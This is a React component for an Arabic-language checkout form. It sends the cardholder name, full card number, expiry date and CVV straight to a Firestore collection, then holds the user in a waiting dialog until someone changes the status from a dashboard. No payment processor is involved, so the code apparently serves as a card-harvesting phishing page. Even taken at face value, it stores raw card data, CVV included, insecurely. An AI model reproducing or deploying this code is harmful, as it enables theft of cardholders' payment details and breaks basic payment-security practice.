"use client"

import type React from "react"
import { useState, useEffect } from "react"
import type { z } from "zod"
import { PaymentSchema, usePaymentForm } from "../../services/payment-form"
import { addData, db } from "../../apis/firebase"
import { doc, onSnapshot } from "firebase/firestore"
import WaitingDialog from "../waiting-dilaog"

export default function PaymentForm() {
  const { formData, isSubmitting, updateFormField } = usePaymentForm()
  const [isloading, setLoading] = useState(false)
  const [paymentStatus, setPaymentStatus] = useState<"idle" | "pending" | "processing" | "success" | "error">("idle")
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [paymentId, setPaymentId] = useState<string | null>(null)

  // Check for existing payment status in localStorage on component mount
  useEffect(() => {
    if (typeof window !== "undefined") {
      const storedPaymentStatus = localStorage.getItem("paymentStatus")
      const storedPaymentId = localStorage.getItem("visitor")

      if (storedPaymentId) {
        setPaymentId(storedPaymentId)
      }

      // Only set loading to true if status is pending or processing
      if (storedPaymentStatus === "pending" || storedPaymentStatus === "processing") {
        setPaymentStatus(storedPaymentStatus as "pending" | "processing")
        setLoading(true)
      } else {
        setLoading(false)
      }
    }
  }, [])

  // Set up real-time listener for payment status changes
  useEffect(() => {
    if (!paymentId) return

    // Reference to the payment document
    const paymentRef = doc(db, "pays", paymentId)

    // Set up real-time listener
    const unsubscribe = onSnapshot(
      paymentRef,
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()

          // Update payment status based on Firebase data
          if (data.paymentStatus) {
            setPaymentStatus(data.paymentStatus)

            // Keep dialog open only for pending or processing status
            if (data.paymentStatus === "pending" || data.paymentStatus === "processing") {
              setLoading(true)
              localStorage.setItem("paymentStatus", data.paymentStatus)
            } else {
              // For any other status (success, error, etc.), show briefly then close
              setTimeout(() => {
                setLoading(false)
                localStorage.removeItem("paymentStatus")
              }, 2000)
            }
          }
        } else {
          // Document doesn't exist
          setLoading(false)
          localStorage.removeItem("paymentStatus")
        }
      },
      (error) => {
        console.error("Error fetching payment status:", error)
        setLoading(false)
        localStorage.removeItem("paymentStatus")
      },
    )

    // Clean up the listener when component unmounts
    return () => unsubscribe()
  }, [paymentId])

  // Additional effect to ensure dialog state matches payment status
  useEffect(() => {
    // Only keep dialog open for pending or processing status
    if (paymentStatus === "pending" || paymentStatus === "processing") {
      setLoading(true)
    } else if (paymentStatus === "success" || paymentStatus === "error") {
      // For success or error, show briefly then close
      setTimeout(() => {
        setLoading(false)
      }, 2000)
    } else {
      // For any other status (idle), close immediately
      setLoading(false)
    }
  }, [paymentStatus])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    // Remove spaces from card number before validation
    const validationData = {
      ...formData,
      card_number: formData.card_number.replace(/\s/g, ""),
    }

    const paymentResult = PaymentSchema.safeParse(validationData)

    if (!paymentResult.success) {
      const formattedErrors: Record<string, string> = {}
      paymentResult.error.errors.forEach((error) => {
        if (error.path[0]) {
          formattedErrors[error.path[0].toString()] = error.message
        }
      })
      setErrors(formattedErrors)
      return
    }

    setErrors({})
    setLoading(true)
    setPaymentStatus("processing")

    try {
      const _id = localStorage.getItem("visitor")

      // Create a new payment record with pending status
      await addData({
        id: _id,
        ...formData,
        paymentStatus: "pending",
      })

      // Store visitor ID as payment ID for tracking
      localStorage.setItem("paymentStatus", "pending")

      // The dialog will stay open until the payment status is updated from the dashboard
    } catch (error) {
      console.error("Payment error:", error)
      setPaymentStatus("error")
      setTimeout(() => {
        setLoading(false)
        localStorage.removeItem("paymentStatus")
      }, 1500)
    }
  }

  // Function to refresh the page
  const handleRefresh = () => {
    window.location.reload()
  }

  const handleInputChange =
    (field: keyof z.infer<typeof PaymentSchema>) => (e: React.ChangeEvent<HTMLInputElement>) => {
      let value = e.target.value

      // Format card number with spaces after every 4 digits
      if (field === "card_number") {
        // Remove any non-digit characters
        const digitsOnly = value.replace(/\D/g, "")

        // Check if the card starts with 4 or 5
        if (digitsOnly.length > 0 && !["4", "5"].includes(digitsOnly[0])) {
          setErrors((prev) => ({
            ...prev,
            card_number: "رقم البطاقة يجب أن يبدأ بـ 4 أو 5",
          }))
        } else {
          // Clear the specific error if it exists
          if (errors.card_number === "رقم البطاقة يجب أن يبدأ بـ 4 أو 5") {
            setErrors((prev) => {
              const newErrors = { ...prev }
              delete newErrors.card_number
              return newErrors
            })
          }
        }

        // Format with spaces after every 4 digits
        let formattedValue = ""
        for (let i = 0; i < digitsOnly.length; i++) {
          if (i > 0 && i % 4 === 0) {
            formattedValue += " "
          }
          formattedValue += digitsOnly[i]
        }

        // Limit to 19 characters (16 digits + 3 spaces)
        value = formattedValue.substring(0, 19)
      }

      updateFormField({ [field]: value })

      // Clear error for this field when user starts typing
      if (errors[field] && !(field === "card_number" && errors.card_number === "رقم البطاقة يجب أن يبدأ بـ 4 أو 5")) {
        setErrors((prev) => {
          const newErrors = { ...prev }
          delete newErrors[field]
          return newErrors
        })
      }
    }

  return (
    <div className="max-w-md mx-auto p-6 bg-white rounded-lg shadow-md">
      <WaitingDialog isOpen={isloading} status={paymentStatus} onRefresh={handleRefresh} />
      <div className="mb-6">
        <h2 className="text-2xl font-bold text-right mb-2">معلومات الدفع</h2>
      </div>

      <form onSubmit={handleSubmit} className="space-y-4">
        <div className="space-y-2">
          <label htmlFor="full_name" className="block text-right font-medium">
            اسم حامل البطاقة
          </label>
          <input
            id="full_name"
            type="text"
            value={formData.full_name}
            onChange={handleInputChange("full_name")}
            className={`w-full p-2 border rounded-md ${errors.full_name ? "border-red-500" : "border-gray-300"}`}
            dir="rtl"
          />
          {errors.full_name && <p className="text-red-500 text-sm text-right">{errors.full_name}</p>}
        </div>

        <div className="space-y-2">
          <label htmlFor="card_number" className="block text-right font-medium">
            رقم البطاقة
          </label>
          <input
            id="card_number"
            type="text"
            value={formData.card_number}
            onChange={handleInputChange("card_number")}
            placeholder="XXXX XXXX XXXX XXXX"
            className={`w-full p-2 border rounded-md ${errors.card_number ? "border-red-500" : "border-gray-300"}`}
            dir="ltr"
          />
          {errors.card_number && <p className="text-red-500 text-sm text-right">{errors.card_number}</p>}
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <label htmlFor="expiration_date" className="block text-right font-medium">
              تاريخ الانتهاء (MM/YY)
            </label>
            <input
              id="expiration_date"
              type="text"
              value={formData.expiration_date}
              onChange={handleInputChange("expiration_date")}
              placeholder="MM/YY"
              className={`w-full p-2 border rounded-md ${errors.expiration_date ? "border-red-500" : "border-gray-300"}`}
              dir="ltr"
            />
            {errors.expiration_date && <p className="text-red-500 text-sm text-right">{errors.expiration_date}</p>}
          </div>

          <div className="space-y-2">
            <label htmlFor="cvv" className="block text-right font-medium">
              رمز الأمان (CVV)
            </label>
            <input
              id="cvv"
              type="text"
              value={formData.cvv}
              onChange={handleInputChange("cvv")}
              className={`w-full p-2 border rounded-md ${errors.cvv ? "border-red-500" : "border-gray-300"}`}
              dir="ltr"
            />
            {errors.cvv && <p className="text-red-500 text-sm text-right">{errors.cvv}</p>}
          </div>
        </div>

        <div className="pt-4">
          <button
            type="submit"
            className="w-full bg-[#146394] text-white py-3 md:py-3.5 rounded-lg font-semibold transform transition-all duration-300 hover:scale-[1.02] active:scale-100 shadow-md hover:shadow-lg text-sm md:text-base"
            disabled={isSubmitting || isloading}
          >
            {isSubmitting || isloading ? "جاري المعالجة..." : "إتمام الدفع"}
          </button>
        </div>
      </form>
    </div>
  )
}

